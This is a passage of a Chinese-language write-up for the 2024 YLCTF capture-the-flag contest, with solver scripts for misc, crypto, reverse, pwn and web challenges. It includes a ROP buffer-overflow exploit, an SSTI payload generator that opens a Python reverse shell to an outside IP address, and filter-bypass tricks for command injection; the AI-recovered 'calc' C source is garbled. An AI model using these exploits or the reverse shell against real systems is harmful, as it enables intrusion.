<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf8 -*-</span><br><br><span class="hljs-keyword">import</span> pyminizip<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">files, zfile</span>):<br>    pyminizip.compress_multiple(files,[], zfile,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    files = [<span class="hljs-string">&#x27;build.py&#x27;</span>]<br>    zfile = <span class="hljs-string">&#x27;crack2.zip&#x27;</span><br>    create(files, zfile)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024-YLCTF/image-20241010131438267.png" srcset="/img/loading.gif" lazyload alt="image-20241010131438267"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241010131456743.png" srcset="/img/loading.gif" lazyload alt="image-20241010131456743"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241010130916284.png" srcset="/img/loading.gif" lazyload alt="image-20241010130916284"></p>
<h5 id="Round-1-trafficdet"><a href="#Round-1-trafficdet" class="headerlink" title="[Round 1] trafficdet"></a>[Round 1] trafficdet</h5><p>sklearn随机森林直接出，一开始以为要练模型折腾半天，诶，没血</p>
<p>训练集0.9 验证集0.1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br>train_data = pd.read_csv(<span class="hljs-string">&#x27;train.csv&#x27;</span>)<br>train_data = train_data.dropna()<br><br>X = train_data.drop(columns=[<span class="hljs-string">&#x27;Label&#x27;</span>])<br>y = train_data[<span class="hljs-string">&#x27;Label&#x27;</span>]<br>X_train, X_val, y_train, y_val = train_test_split(X, y, test_size=<span class="hljs-number">0.1</span>, random_state=<span class="hljs-number">42</span>)<br><br>model = RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)<br>model.fit(X_train, y_train)<br>y_pred = model.predict(X_val)<br><br><span class="hljs-built_in">print</span>(accuracy_score(y_val, y_pred))<br><br>test_data = pd.read_csv(<span class="hljs-string">&#x27;test.csv&#x27;</span>)<br>X_test = test_data<br>test_preds = model.predict(X_test)<br><br>result = pd.DataFrame(&#123;<br>    <span class="hljs-string">&#x27;Label&#x27;</span>: test_preds<br>&#125;)<br>result.index=result.index+<span class="hljs-number">1</span><br>result.to_csv(<span class="hljs-string">&#x27;result.csv&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h5 id="Round-1-whatmusic"><a href="#Round-1-whatmusic" class="headerlink" title="[Round 1] whatmusic"></a>[Round 1] whatmusic</h5><p>png逆序，修复宽高，翻转</p>
<p>lyra解音频，在线网站听一下，听不了一点</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;rb+&quot;</span>)<span class="hljs-selector-class">.read</span>()<br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.png&quot;</span>,<span class="hljs-string">&quot;wb+&quot;</span>)<span class="hljs-selector-class">.write</span>(f<span class="hljs-selector-attr">[::-1]</span>)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024-YLCTF/image-20241011203712841.png" srcset="/img/loading.gif" lazyload alt="image-20241011203712841"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241011213855014.png" srcset="/img/loading.gif" lazyload alt="image-20241011213855014"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241011203751254.png" srcset="/img/loading.gif" lazyload alt="image-20241011203751254"></p>
<p>YLCTF{YLYRM6S5ICG00ODLL0VE}</p>
<h4 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h4><h5 id="Round-1-giaopwn"><a href="#Round-1-giaopwn" class="headerlink" title="[Round 1] giaopwn"></a>[Round 1] giaopwn</h5><p><img src="../../../../img/archives/2024-YLCTF/image-20241012204302823.png" srcset="/img/loading.gif" lazyload alt="image-20241012204302823"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012204318368.png" srcset="/img/loading.gif" lazyload alt="image-20241012204318368"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012204334392.png" srcset="/img/loading.gif" lazyload alt="image-20241012204334392"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-attribute">p</span>=remote(&quot;challenge.yuanloo.com&quot;,43089)<br>p.recvuntil(b<span class="hljs-string">&quot;welcome to YLCTF&quot;</span>)<br><span class="hljs-attribute">rdi</span>=0x400743<br><span class="hljs-attribute">system</span>=0x4006D2<br><span class="hljs-attribute">sh</span>=0x601048<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28+p64(rdi)+p64(sh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h4><h5 id="Round-1-xor"><a href="#Round-1-xor" class="headerlink" title="[Round 1] xor"></a>[Round 1] xor</h5><p>upx脱壳，看了是xor 28，直接写脚本解密</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012002620489.png" srcset="/img/loading.gif" lazyload alt="image-20241012002620489"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012002638396.png" srcset="/img/loading.gif" lazyload alt="image-20241012002638396"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import xor<br><br><span class="hljs-attribute">key</span>=<span class="hljs-number">28</span><br><span class="hljs-attribute">l</span>=[<span class="hljs-number">0</span>x45,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x2d,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x25,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x25,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x2e,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x78,<span class="hljs-number">0</span>x2d,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x2c,<span class="hljs-number">0</span>x2e,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>x7a,<span class="hljs-number">0</span>x2c,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>x7a,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x1c]<br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in l:<br>    <span class="hljs-attribute">flag</span>+=xor(chr(int(i)%<span class="hljs-number">128</span>),key).decode()<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p>YLCTF{b3c15c89-9ee3-4bc2-bd1a-302eac4f05f3}</p>
<h5 id="Round-1-calc"><a href="#Round-1-calc" class="headerlink" title="[Round 1] calc"></a>[Round 1] calc</h5><p>gpt复原源码</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">typedef struct Stack &#123;<br>    <span class="hljs-type">double</span>* top; <span class="hljs-type">double</span>* low; <span class="hljs-type">int</span> size;<br>&#125;stack;<span class="hljs-type">void</span> init(stack* s) &#123;<br>    s-&gt;low = (<span class="hljs-type">double</span>*)malloc((sizeof(<span class="hljs-type">double</span>))) s-&gt;top = s-&gt;low;s-&gt;size = <span class="hljs-number">100</span>;<br>&#125;<span class="hljs-type">void</span> push(stack* s, <span class="hljs-type">double</span> e) &#123;<br>    *(s-&gt;top) = e; s-&gt;top++;<br>&#125;<span class="hljs-type">void</span> pop(stack* s, <span class="hljs-type">double</span>* e) &#123;<br>    *e = *<span class="hljs-comment">--(s-&gt;top);</span><br>&#125;<span class="hljs-type">int</span> main() &#123;<br>    setbuf((__acrt_iob_func(<span class="hljs-number">0</span>)), <span class="hljs-number">0</span>); setbuf((__acrt_iob_func(<span class="hljs-number">1</span>)), <span class="hljs-number">0</span>);stack s; <span class="hljs-type">char</span> ch;<span class="hljs-type">double</span> d, e <span class="hljs-type">char</span> num[<span class="hljs-number">100</span>];<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;init(&amp;s);puts(&quot;input data , end of &#x27;#&#x27;&quot;);scanf(&quot;%s&quot;, &amp;ch);<span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>        <span class="hljs-keyword">while</span> (ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>            num[i] = ch;scanf(&quot;%c&quot;, &amp;ch);<span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                d = atof(num);push(&amp;s, d); i = <span class="hljs-number">0</span>;break<br>            &#125;<br>        &#125;switch (ch) &#123;<br>        cas<span class="hljs-string">e&#x27;+&#x27;</span>:pop(&amp;s\uff0c &amp; d);pop(&amp;s, &amp;e);push(&amp;s, e + d); break;cas<span class="hljs-string">e&#x27;-&#x27;</span>:pop(&amp;s, &amp;d);pop(&amp;s, &amp;e);push(&amp;s, e - d);break;cas<span class="hljs-string">e&#x27;*&#x27;</span>:pop(&amp;s, &amp;d);pop(&amp;s, &amp;e);push(&amp;s, e * d); break;cas<span class="hljs-string">e&#x27;/&#x27;</span>:pop(&amp;s, &amp;d);pop(&amp;s, &amp;e);push(&amp;s, e / d) break;<br>        &#125;scanf(&quot;%c&quot;, &amp;ch);<br>    &#125;pop(&amp;s, &amp;d); <span class="hljs-keyword">if</span> (d == <span class="hljs-number">125</span>) &#123;<br>        printf(&quot;%s&quot;, getenv(&quot;GZCTF_FLAG&quot;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="Round-1-xorplus"><a href="#Round-1-xorplus" class="headerlink" title="[Round 1] xorplus"></a>[Round 1] xorplus</h5><p>解密RC4 xor</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs pf">def rc4_initialize(key):<br>    <span class="hljs-keyword">state</span> = list(range(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):<br>        j = (j + <span class="hljs-keyword">state</span>[i] + ord(key[i % len(key)]) + <span class="hljs-number">1300</span>) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">state</span>[i], <span class="hljs-keyword">state</span>[j] = <span class="hljs-keyword">state</span>[j], <span class="hljs-keyword">state</span>[i]<br>    return <span class="hljs-keyword">state</span><br><br><br>def rc4_transform(<span class="hljs-keyword">state</span>, data):<br>    i = j = <span class="hljs-number">0</span><br>    output = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + <span class="hljs-keyword">state</span>[i]) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">state</span>[i], <span class="hljs-keyword">state</span>[j] = <span class="hljs-keyword">state</span>[j], <span class="hljs-keyword">state</span>[i]<br>        t = <span class="hljs-keyword">state</span>[(<span class="hljs-keyword">state</span>[i] + <span class="hljs-keyword">state</span>[j]) % <span class="hljs-number">256</span>]<br>        output.append(((byte - <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0</span>xFF) ^ t)<br>    return bytes(output)<br><br><br>def main():<br>    secret_key = <span class="hljs-string">&quot;welcometoylctf&quot;</span><br>    encrypted_sequence = [<span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x1b, <span class="hljs-number">0</span>x2d, <span class="hljs-number">0</span>x9e, <span class="hljs-number">0</span>x6f, <span class="hljs-number">0</span>x28, <span class="hljs-number">0</span>x33, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>xa1, <span class="hljs-number">0</span>xa2, <span class="hljs-number">0</span>x97, <span class="hljs-number">0</span>xcc, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x22,<br>                          <span class="hljs-number">0</span>x67, <span class="hljs-number">0</span>x42, <span class="hljs-number">0</span>xf1, <span class="hljs-number">0</span>x30, <span class="hljs-number">0</span>x2d, <span class="hljs-number">0</span>x80, <span class="hljs-number">0</span>x55, <span class="hljs-number">0</span>x4a, <span class="hljs-number">0</span>x1c, <span class="hljs-number">0</span>x6c, <span class="hljs-number">0</span>x76, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>x76, <span class="hljs-number">0</span>x7c, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x9,<br>                          <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x8a, <span class="hljs-number">0</span>x49, <span class="hljs-number">0</span>x5c, <span class="hljs-number">0</span>xfd, <span class="hljs-number">0</span>x8, <span class="hljs-number">0</span>x7d, <span class="hljs-number">0</span>x28, <span class="hljs-number">0</span>xf8, <span class="hljs-number">0</span>xc, <span class="hljs-number">0</span>x85, <span class="hljs-number">0</span>xa6]<br><br>    <span class="hljs-keyword">state</span> = rc4_initialize(secret_key)<br>    decrypted_message = rc4_transform(<span class="hljs-keyword">state</span>, encrypted_sequence)<br><br>    print(decrypted_message.decode(&#x27;utf-<span class="hljs-number">8</span>&#x27;))<br><br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Round-1-Injct"><a href="#Round-1-Injct" class="headerlink" title="[Round 1] Injct"></a>[Round 1] Injct</h5><p>ssti fenjing直接嗦，bash -i弹不了shell，jiaja肯定有python，直接python弹shell</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br>url =&quot;http://challenge.yuanloo.com:30166/greet&quot;<br>@functools.lru_cache(<span class="hljs-number">1000</span>)<br>def waf(payload: str):<br>    <span class="hljs-type">time</span>.sleep(<span class="hljs-number">0.01</span>)<br>    resp = requests.post(url, timeout=<span class="hljs-number">10</span>, data=&#123;&quot;name&quot;: payload&#125;)<br>    <span class="hljs-keyword">return</span> &quot;Error&quot; <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br><br><br><span class="hljs-keyword">if</span> __name__ == &quot;__main__&quot;:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;python3 -c \&#x27;</span><span class="hljs-keyword">import</span> socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.<span class="hljs-keyword">connect</span>((&quot;101.70.156.105&quot;,<span class="hljs-number">27661</span>)); os.dup2(s.fileno(), <span class="hljs-number">0</span>); os.dup2(s.fileno(), <span class="hljs-number">1</span>); os.dup2(s.fileno(), <span class="hljs-number">2</span>); subprocess.<span class="hljs-keyword">call</span>([&quot;/bin/sh&quot;, &quot;-i&quot;])\<span class="hljs-string">&#x27;&#x27;</span><br>    )<br>    print(shell_payload)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024-YLCTF/image-20241011231338340.png" srcset="/img/loading.gif" lazyload alt="image-20241011231338340"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241011231411184.png" srcset="/img/loading.gif" lazyload alt="image-20241011231411184"></p>
<h5 id="Round-1-Disal"><a href="#Round-1-Disal" class="headerlink" title="[Round 1] Disal"></a>[Round 1] Disal</h5><p>简单绕过</p>
<p>a&#x3D;9999999abcdef</p>
<p>b&#x3D;9999a</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012011422640.png" srcset="/img/loading.gif" lazyload alt="image-20241012011422640"></p>
<h5 id="Round-1-shxpl"><a href="#Round-1-shxpl" class="headerlink" title="[Round 1] shxpl"></a>[Round 1] shxpl</h5><p>过滤了%20|;?等一堆东西，f s t都不行</p>
<p>%09绕空格过滤，通配符绕禁止s</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012035751372.png" srcset="/img/loading.gif" lazyload alt="image-20241012035751372"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241012040139537.png" srcset="/img/loading.gif" lazyload alt="image-20241012040139537"></p>
<p>YLCTF{092b6c8d-542a-453d-bfe2-4cd72b902f4c}</p>
<h3 id="Round-2"><a href="#Round-2" class="headerlink" title="Round 2"></a>Round 2</h3><h4 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h4><h5 id="Round-2-ancat"><a href="#Round-2-ancat" class="headerlink" title="[Round 2] ancat"></a>[Round 2] ancat</h5><p>题目提示叱咤月海鱼鱼猫，Ancat，看加密代码是一个改过的猫脸变换</p>
<p>网上找一下，再根据变换代码微调一下</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241020165142988.png" srcset="/img/loading.gif" lazyload alt="image-20241020165142988"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arnold_decode</span>(<span class="hljs-params">image, shuffle_times, a, b</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; decode for rgb image that encoded by Arnold</span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        image: rgb image encoded by Arnold</span><br><span class="hljs-string">        shuffle_times: how many times to shuffle</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        decode image</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1:创建新图像</span><br>    decode_image = np.zeros(shape=image.shape)<br><br>    <span class="hljs-comment"># 2：计算N</span><br>    h, w = image.shape[<span class="hljs-number">0</span>], image.shape[<span class="hljs-number">1</span>]<br>    N = h  <span class="hljs-comment"># 或N=w</span><br><br>    <span class="hljs-comment"># 3：遍历像素坐标变换</span><br>    <span class="hljs-keyword">for</span> time <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(shuffle_times):<br>        <span class="hljs-keyword">for</span> ori_x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>            <span class="hljs-keyword">for</span> ori_y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>                <span class="hljs-comment"># 按照公式坐标变换</span><br>                new_x = ((a * b + <span class="hljs-number">1</span>) * ori_x + (-b) * ori_y) % N<br>                new_y = ((-a) * ori_x + ori_y) % N<br>                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]<br>        image = np.copy(decode_image)<br><br>    cv2.imwrite(<span class="hljs-string">&#x27;en_flag.png&#x27;</span>, image, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> decode_image<br><br><span class="hljs-comment"># 测试解密</span><br>img = cv2.imread(<span class="hljs-string">&quot;en_flag.png&quot;</span>)  <span class="hljs-comment"># 变换的图片</span><br>st = <span class="hljs-number">3</span><br>a = <span class="hljs-number">6</span><br>b = <span class="hljs-number">9</span><br>pic = arnold_decode(img, st, a, b)<br></code></pre></td></tr></table></figure>

<h5 id="Round-2-rand"><a href="#Round-2-rand" class="headerlink" title="[Round 2] rand"></a>[Round 2] rand</h5><p>ASIS2023原题，稍微改一下出</p>
<p>给定p，输入p，x，y满足gx+y≡x∗ymodp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>io = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">35268</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    intp3 = io.recvuntil(<span class="hljs-string">b&#x27;The modulus p is: &#x27;</span>)<br>    intp = io.recvuntil(<span class="hljs-string">b&quot;send the base g: \n&quot;</span>)<br>    p=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, intp.decode())[<span class="hljs-number">0</span>])<br>    g = p-<span class="hljs-number">4</span><br>    io.sendline(<span class="hljs-built_in">str</span>(g).encode())<br>    io.recvuntil(<span class="hljs-string">b&#x27;pow(g, x + y, p) = x * y, as x and y:\n&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&quot;2,&quot;</span>+<span class="hljs-built_in">str</span>(p-<span class="hljs-number">2</span>).encode())<br>    <span class="hljs-built_in">print</span>(p,_)<br><span class="hljs-built_in">print</span>(io.recvall(timeout=<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure>

<h5 id="Round-2-ezAES"><a href="#Round-2-ezAES" class="headerlink" title="[Round 2] ezAES"></a>[Round 2] ezAES</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key = <span class="hljs-string">b&#x27;YLCTF-CRYPTO&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;YLCTF-CRYPTO&#x27;</span>))<br>iv = <span class="hljs-string">b&#x27;YLCTF-IV&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;YLCTF-IV&#x27;</span>))<br>encrypted_data = <span class="hljs-string">b&#x27;\xed\x1d]\xe6p\xb7\xfa\x90/Gu\xf4\xe2\x96\x84\xef90\x92e\xb4\xf8]&quot;\xfc6\xf8\x8cS\xe9b\x19&#x27;</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)<br><span class="hljs-built_in">print</span>(decrypted_data.decode())<br></code></pre></td></tr></table></figure>

<p>\x00补全空位解密</p>
<p>input your result:keysauikoydasuicxs<br>YLCTF{c4bca408-a3bf-4b4b-8bb3-be483321319e}</p>
<h4 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Round-2-Trace"><a href="#Round-2-Trace" class="headerlink" title="[Round 2] Trace"></a>[Round 2] Trace</h5><p>文件后藏了base64，分离后cyberchef解出来rar，使用加密Rar5加密，ARCHPR用不了，于是用PasswareKit爆破出密码得到图片，PS拼一下得到flag</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241020161948798.png" srcset="/img/loading.gif" lazyload alt="image-20241020161948798"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241018174609809.png" srcset="/img/loading.gif" lazyload alt="image-20241018174609809"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241018193709589.png" srcset="/img/loading.gif" lazyload alt="image-20241018193709589"></p>
<h5 id="Round-2-IMGAI"><a href="#Round-2-IMGAI" class="headerlink" title="[Round 2] IMGAI"></a>[Round 2] IMGAI</h5><p>简单预测，看了一下二进制转图大小640,480，pwntools接收直接reshape出来去预测</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241019161031685.png" srcset="/img/loading.gif" lazyload alt="image-20241019161031685"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241019161433785.png" srcset="/img/loading.gif" lazyload alt="image-20241019161433785"></p>
